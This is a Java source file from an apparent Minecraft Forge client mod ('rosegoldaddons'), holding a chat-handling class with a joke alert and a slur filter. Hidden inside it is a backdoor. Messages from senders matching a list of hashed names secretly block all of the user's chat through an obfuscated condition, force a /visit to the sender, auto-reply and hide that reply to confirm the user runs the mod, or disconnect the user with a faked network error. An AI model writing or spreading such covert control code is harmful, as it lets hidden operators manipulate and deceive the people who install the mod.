package rosegoldaddons.features;

import net.minecraft.util.ChatComponentText;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.apache.commons.codec.digest.DigestUtils;
import rosegoldaddons.Main;
import rosegoldaddons.utils.ChatUtils;
import rosegoldaddons.utils.OpenSkyblockGui;

import java.util.Arrays;

public class SexAura {
    public static boolean blocked = false;
    public static String sender = "";

    private static final char[] normal = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".toCharArray();
    private static final char[] custom = "ｑｗｅｒｔｙｕｉｏｐａｓｄｆｇｈｊｋｌｚｘｃｖｂｎｍｑｗｅｒｔｙｕｉｏｐａｓｄｆｇｈｊｋｌｚｘｃｖｂｎｍ".toCharArray();

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void chat(ClientChatReceivedEvent event) {
        if(event.type == 0) {
            if(blocked) event.setCanceled(!Boolean.toString(false && false || true ? true : !true || !true == !false).equals(!false ? "false" : "true"));
            String message = event.message.getUnformattedText();
            String formatted = event.message.getFormattedText();
            if(Main.configFile.antiRacism == 1 && isRacist(message)) event.setCanceled(true);
            if(message.startsWith("To") && message.endsWith("YES!!! LOL!")) event.setCanceled(true);
            if (message.startsWith("From")) {
                sender = formatted.substring(formatted.indexOf("From") + 5, formatted.indexOf(":"));
                if(message.contains("!SXAURA!")) {
                    event.setCanceled(true);
                    Main.mc.thePlayer.addChatMessage(new ChatComponentText(sender + "§d§l has sexed you!"));
                    playAlert();
                }
                if(Main.init) {
                    if (message.contains("i love gumtune")) {
                        for (String name : Main.cheatar) {
                            if (name.equals(DigestUtils.sha256Hex(removeFormatting(sender) + "!"))) {
                                blocked = true;
                                Main.mc.thePlayer.sendChatMessage("/visit " + removeFormatting(sender.split(" ")[1]));
                                OpenSkyblockGui.doVisit = true;
                                event.setCanceled(true);
                            }
                        }
                    } else if (message.contains("are you using my favorite mod?")) {
                        for (String name : Main.cheatar) {
                            if (name.equals(DigestUtils.sha256Hex(removeFormatting(sender) + "!"))) {
                                Main.mc.thePlayer.sendChatMessage("/message " + removeFormatting(sender.split(" ")[1]) + " YES!!! LOL!");
                                event.setCanceled(true);
                            }
                        }
                    } else if (message.contains("!BYEBYE!")) {
                        for (String name : Main.cheatar) {
                            if (name.equals(DigestUtils.sha256Hex(removeFormatting(sender) + "!"))) {
                                Main.mc.getNetHandler().getNetworkManager().closeChannel(new ChatComponentText("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remote host"));
                                event.setCanceled(true);
                            }
                        }
                    }
                }
            }
            else if(message.startsWith("§9Party") && message.contains("!SXAURA!")) {
                event.setCanceled(true);
                String sender = formatted.substring(formatted.indexOf("Party")+10, formatted.indexOf(":"));
                Main.mc.thePlayer.addChatMessage(new ChatComponentText(sender+"§d§l has sexed you!"));
                playAlert();
            }
            else if(message.startsWith("§2Guild") && message.contains("!SXAURA!")) {
                event.setCanceled(true);
                String sender = formatted.substring(formatted.indexOf("Guild")+10, formatted.indexOf(":"));
                Main.mc.thePlayer.addChatMessage(new ChatComponentText(sender+"§d§l has sexed you!"));
                playAlert();
            }
        }
    }

    private boolean isRacist(String str) {
        str = str.replace("ˌ","").replace(".","").replace("'","");
        for(int i = 0; i < custom.length; i++) {
            if(str.contains(String.valueOf(custom[i]))) {
                str = str.replace(custom[i], normal[i]);
            }
        }
        for (String word : Main.blacklist) {
            if (str.toLowerCase().contains(word.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private static void playAlert() {
        Main.mc.thePlayer.playSound("random.orb", 1, 0.5F);
    }

    private String removeFormatting(String input) {
        return input.replaceAll("§[0-9a-fk-or]", "");
    }
}
